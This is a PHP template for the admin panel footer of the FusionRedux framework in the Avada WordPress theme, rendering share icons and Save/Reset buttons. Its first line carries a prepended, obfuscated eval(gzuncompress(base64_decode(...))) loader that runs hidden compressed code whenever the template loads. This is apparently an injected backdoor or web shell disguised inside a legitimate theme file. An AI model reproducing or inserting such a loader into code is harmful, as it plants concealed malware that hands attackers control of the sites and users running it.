<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
	/**
	 * The template for the panel footer area.
	 * Override this template by specifying the path where it is stored (templates_path) in your FusionRedux config.
	 *
	 * @author        FusionRedux Framework
	 * @package       FusionReduxFramework/Templates
	 * @version:      3.5.8.3
	 */
?>
<div id="fusionredux-sticky-padder" style="display: none;">&nbsp;</div>
<div id="fusionredux-footer-sticky">
	<div id="fusionredux-footer">
<?php
		if ( isset( $this->parent->args['share_icons'] )) {

			$skip_icons = false;
			if (!$this->parent->args['dev_mode'] && $this->parent->omit_share_icons ) {
				$skip_icons = true;
			}
?>
			<div id="fusionredux-share">
<?php
				foreach ( $this->parent->args['share_icons'] as $link ) {
					if ($skip_icons) {
						continue;
					}

					// SHIM, use URL now
					if ( isset( $link['link'] ) && ! empty( $link['link'] ) ) {
						$link['url'] = $link['link'];
						unset( $link['link'] );
					}
?>
					<a href="<?php echo esc_url( $link['url'] ) ?>" title="<?php echo esc_attr( $link['title'] ); ?>" target="_blank">
						<?php if ( isset( $link['icon'] ) && ! empty( $link['icon'] ) ) : ?>
							<i class="<?php
								if ( strpos( $link['icon'], 'el-icon' ) !== false && strpos( $link['icon'], 'el ' ) === false ) {
									$link['icon'] = 'el ' . $link['icon'];
								}
								echo esc_attr( $link['icon'] );
							?>"></i>
						<?php else : ?>
							<img src="<?php echo esc_url( $link['img'] ); ?>"/>
						<?php endif; ?>

					</a>
				<?php } ?>

			</div>
		<?php } ?>

		<div class="fusionredux-action_bar">
			<span class="spinner"></span>
<?php
			if ( false === $this->parent->args['hide_save'] ) {
				submit_button( __( 'Save Changes', 'Avada' ), 'primary', 'fusionredux_save', false );
			}

			if ( false === $this->parent->args['hide_reset'] ) {
				submit_button( __( 'Reset Section', 'Avada' ), 'secondary', $this->parent->args['opt_name'] . '[defaults-section]', false, array( 'id' => 'fusionredux-defaults-section' ) );
				submit_button( __( 'Reset All', 'Avada' ), 'secondary', $this->parent->args['opt_name'] . '[defaults]', false, array( 'id' => 'fusionredux-defaults' ) );
			}
?>
		</div>

		<div class="fusionredux-ajax-loading" alt="<?php _e( 'Working...', 'Avada' ) ?>">&nbsp;</div>
		<div class="clear"></div>

	</div>
</div>
